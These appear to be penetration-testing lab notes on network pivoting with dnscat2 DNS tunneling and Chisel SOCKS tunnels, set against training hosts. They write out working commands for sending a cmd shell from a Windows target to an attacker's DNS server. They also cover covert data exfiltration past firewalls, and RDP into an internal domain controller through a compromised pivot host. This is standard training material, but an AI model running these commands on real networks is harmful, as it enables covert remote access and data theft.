### DNS Tunneling with Dnscat2

[Dnscat2](https://github.com/iagox86/dnscat2)

```
# Dnscat2 is a tunneling tool that uses DNS protocol to send data between two hosts. 
# It uses an encrypted Command-&-Control (C&C or C2) channel and sends data inside TXT records within the DNS protocol.
```

```
# Usually, every active directory domain environment in a corporate network will have its own DNS server, 
# which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating 
# in the overarching DNS system. 

# However, with dnscat2, the address resolution is requested from an external server. 
# When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead 
# of a legitimate DNS request. 

# Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections 
# which strip the HTTPS connections and sniff the traffic.

# For example we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host.
```

### Setting Up & Using dnscat2

```
git clone https://github.com/iagox86/dnscat2.git                   # Cloning dnscat2 and Setting Up the Server
cd dnscat2/server/
sudo gem install bundler
sudo bundle install

# We can then start the dnscat2 server by executing the dnscat2 file.

sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

```
# After running the server, it will provide us the secret key, 
# which we will have to provide to our dnscat2 client on the Windows host 
# so that it can authenticate and encrypt the data that is sent to our external dnscat2 server. 

# We can use the client with the dnscat2 project or use dnscat2-powershell, 
# a dnscat2 compatible PowerShell-based client that we can run from Windows targets 
# to establish a tunnel with our dnscat2 server. 

# We can clone the project containing the client file to our attack host, then transfer it to the target.
```

```
# Cloning dnscat2-powershell to the Attack Host:

git clone https://github.com/lukebaggett/dnscat2-powershell.git

# Once the dnscat2.ps1 file is on the target we can import it and run associated cmd-lets.

PS C:\htb> Import-Module .\dnscat2.ps1

# After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. 
# We can send back a CMD shell session to our server.

PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec...589d21 -Exec cmd

# We must use the pre-shared secret (-PreSharedSecret) generated on the server to ensure our session is established and encrypted.
# If all steps are completed successfully, we will see a session established with our server

# Confirming Session Establishment:
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>
```

```
# We can list the options we have with dnscat2 by entering ? at the prompt:

dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```

```
# We can use dnscat2 to interact with sessions and move further in a target environment on engagements. 
# We will not cover all possibilities with dnscat2 in this module, but it is strongly encouraged to practice with it 
# and maybe even find creative ways to use it on an engagement. 
# Let's interact with our established session and drop into a shell.


dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

### SOCKS5 Tunneling with Chisel

[Chisel](https://github.com/jpillora/chisel)

```
# Chisel is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH. 
# Chisel can create a client-server tunnel connection in a firewall restricted environment.

# Imagine we have compromised the Ubuntu server, we can start a Chisel server on it 
# that will listen on a specific port and forward our traffic to the internal network through the established tunnel.
```

```
git clone https://github.com/jpillora/chisel.git               # Setting Up & Using Chisel

cd chisel                                                      # Building the Chisel Binary (Go needed on host)
go build
```

```
# It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, 
# not just for performance reasons but also considering detection. 
# Two beneficial resources to complement this particular concept are Oxdf's blog post "Tunneling with Chisel and SSF" 
# and IppSec's walkthrough of the box Reddish. 
# IppSec starts his explanation of Chisel, building the binary and shrinking the size of the binary at the 24:29 mark of his video.
```

["Tunneling with Chisel and SSF"](https://0xdf.gitlab.io/cheatsheets/chisel) 
[IppSec_video](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s)

```
# Once the binary is built, we can use SCP to transfer it to the target pivot host.

scp chisel ubuntu@10.129.202.64:~/                             # Transferring Chisel Binary to Pivot Host

# Then we can start the Chisel server/listener.

ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5            # Running the Chisel Server on the Pivot Host

# The Chisel listener will listen for incoming connections on port 1234 using SOCKS5 (--socks5) 
# and forward it to all the networks that are accessible from the pivot host. 

# In our case, the pivot host has an interface on the 172.16.5.0/23 network, 
# which will allow us to reach hosts on that network.
# We can start a client on our attack host and connect to the Chisel server.

./chisel client -v 10.129.202.64:1234 socks                    # Connecting to the Chisel Server (from pentest Host)

# As you can see in the above output, the Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH 
# between the Chisel server and the client and has started listening on port 1080. 

# Now we can modify our proxychains.conf file located at /etc/proxychains.conf and add 1080 port at the end 
# so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.

tail -f /etc/proxychains.conf                                  # Editing & Confirming proxychains.conf
```

```
# Now if we use proxychains with RDP, 
# we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.

proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

### Chisel Reverse Pivot

```
# In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. 
# Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. 
# In such cases, we can use Chisel with the reverse option.
```

```
# When the Chisel server has --reverse enabled, remotes can be prefixed with R to denote reversed. 
# The server will listen and accept connections, and they will be proxied through the client, which specified the remote. 
# Reverse remotes specifying R:socks will listen on the server's default socks port (1080) 
# and terminate the connection at the client's internal SOCKS5 proxy.

# We'll start the server in our attack host with the option --reverse.

sudo ./chisel server --reverse -v -p 1234 --socks5              # Starting the Chisel Server on our Attack Host

# Then we connect from the Ubuntu (pivot host) to our attack host, using the option R:socks

ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks       # Connecting the Chisel Client to our Attack Host

# Next editing the proxychains.conf file, with socks5 127.0.0.1 1080 then confirm our configuration changes using tail.

tail -f /etc/proxychains.conf                                   # Editing & Confirming proxychains.conf 

# If we use proxychains with RDP, we can connect to the DC on the internal network 
# through the tunnel we have created to the Pivot host.

proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
